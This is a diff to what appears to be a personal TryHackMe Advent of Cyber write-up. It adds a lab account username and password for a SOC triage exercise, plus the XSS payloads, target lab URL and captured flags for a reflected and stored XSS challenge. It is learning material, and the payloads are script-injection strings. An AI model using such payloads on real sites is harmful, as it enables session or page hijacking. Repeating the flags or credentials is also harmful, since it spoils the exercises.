@@ -1407,7 +1407,22 @@ Flag: `THM{Cr4ck1n6_z1p$_1s_34$yyyy}`
 
 ### SOC Alert Triaging - Tinsel Triage (Day 10)
 
+_Username:_`usr-aoc25@tryhackme.onmicrosoft.com`
+_Password:_ `#^4J7DP+RM#5S2Z-`
+
+> Not documented due to being to tired
+
 ### XSS - Merry XSSMas (Day 11)
+
+_Host:_ `10.66.138.27`
+_Target:_ `http://10.66.138.27/search?term=gift`
+_Initial Payload:_ `/search?term=<script>alert( atob("VEhNe0V2aWxfQnVubnl9") )</script>`
+_Secondary Payload:_ `<script>atob('aHR0cDovLzEwLjY2LjEzOC4yNy9zZWFyY2g/dGVybT1naWZ0')</script>`
+
+#### Methodology
+
+Payload Flag (XSS): `THM{Evil_Bunny}`
+Second Flag (Stored XSS): `THM{Evil_Stored_Egg}`
 
 ### Phishing - Phishmas Greetings (Day 12)
 
